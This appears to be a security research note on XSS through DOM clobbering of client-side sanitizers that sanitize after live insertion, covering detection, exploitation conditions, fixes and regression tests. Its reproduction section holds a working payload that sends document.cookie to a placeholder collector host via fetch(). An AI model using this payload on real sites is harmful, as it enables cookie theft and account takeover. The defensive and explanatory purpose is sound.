# Live DOM Sanitizer DOM Clobbering

## Date

2026-07-09

## Target Type

Web applications that insert untrusted HTML into the live document before sanitization, especially snippet preview tools, editors, rich-text renderers, and client-side "safe HTML" helpers

## Bug Class

XSS through DOM clobbering of sanitizer internals during in-place/live-DOM sanitization

## Initial Signal

Look for code patterns like:

```javascript
target.innerHTML = raw;
sanitize(target);
```

or:

```javascript
element.insertAdjacentHTML('beforeend', raw);
walkAndClean(element);
```

Supporting hints:

- challenge or app copy mentions a client-side sanitizer
- "walks the DOM" or "sync walk" language
- sanitization happens after rendering, not before mounting
- UI hints such as "load before guard", "render then sanitize", or "preview after clean"

## Pattern

The application creates real DOM nodes from attacker HTML first, then reads security-sensitive properties from live host objects:

```javascript
target.innerHTML = String(raw);
const walker = document.createTreeWalker(target, NodeFilter.SHOW_ELEMENT);
```

If those reads are not taken from safe prototypes, attacker markup can interfere before the walk even begins.

Common clobber targets:

```text
document.createTreeWalker
document.body
document.forms
window.NodeFilter
element.attributes
element.removeAttribute
element.remove
```

Example clobber primitive:

```html
<img name="createTreeWalker">
```

If the browser exposes named elements on `document`, the sanitizer may later attempt:

```javascript
document.createTreeWalker(...)
```

and hit the attacker-created element instead of the real function.

## Trust Boundary

Once untrusted markup is inserted into the live DOM, browser named-property behavior and host object lookups become attacker-influenced. The DOM is no longer a safe intermediate representation unless sanitization uses prototype-safe access exclusively.

## Minimal Reproduction

Generic proof:

```html
<img name="createTreeWalker"><img src=x onerror="fetch('https://[collector]?c='+encodeURIComponent(document.cookie))">
```

This works when:

1. attacker HTML is inserted into the live DOM
2. sanitizer later calls `document.createTreeWalker(...)` through the live document
3. sanitizer failure occurs before event handlers are stripped
4. the page fails open briefly or clears the DOM only after the event already fired

## Investigation Workflow

1. Confirm whether the sink is live-DOM insertion (`innerHTML`, `insertAdjacentHTML`, direct mounting) or off-DOM parsing (`template`, `DOMParser`, detached document).
2. Identify every security-sensitive property/method read after insertion.
3. Separate prototype-safe calls from instance/document lookups.
4. Test one clobber target at a time.
5. Prefer primitives that both break sanitization and leave an immediately firing sink (`img onerror`, similar error/load paths).
6. Check whether sanitizer exceptions are caught only after the dangerous event already has time to fire.

## Why Failed Tests Fail

- The app sanitizes in a detached tree before mounting.
- The dangerous method is cached from the prototype, not read from the live instance.
- The clobbered property is not exposed as a named property in that browser context.
- The event does not fire quickly enough before cleanup or fallback rendering.
- The cookie is `HttpOnly`, so execution happens but `document.cookie` stays empty.

## Why Working Tests Work

The browser exposes attacker-created named elements on `document` or other host objects after live insertion. The sanitizer then dereferences a security-critical method from that now-influenced object, throws or misbehaves, and leaves a short execution window before fallback logic removes the content.

## Impact

- Same-origin XSS in preview/render flows that appear "sanitized"
- Reviewer or admin bot cookie theft
- Potential CSRF-on-behalf-of-reviewer or account takeover
- False confidence from a sanitizer that only fails under real browser host-object behavior

## Fix

- Sanitize in a detached tree before inserting into the live DOM.
- Cache security-sensitive DOM methods from prototypes:

```javascript
const _createTreeWalker = Document.prototype.createTreeWalker;
```

- Call prototype methods via `.call(...)`, not through live instances.
- Fail closed on sanitizer exceptions. Never briefly expose unsanitized DOM and then replace it after the fact.
- Add browser-based tests for named-property DOM clobbering against `document`, `window`, and form-backed host objects.

## Regression Test

These should remain safe:

```html
<img name="createTreeWalker"><img src=x onerror=alert(1)>
<form><input id="remove"></form>
<input name="attributes">
```

Expected result:

- no live event handler execution
- no sanitizer exception exposed to the user
- no unsanitized markup survives in the final DOM

## Future Checklist Item

When a sanitizer uses `innerHTML` first and "walks" afterward, audit every post-insert property lookup as a potential DOM clobber target before spending time on exotic parser tricks.
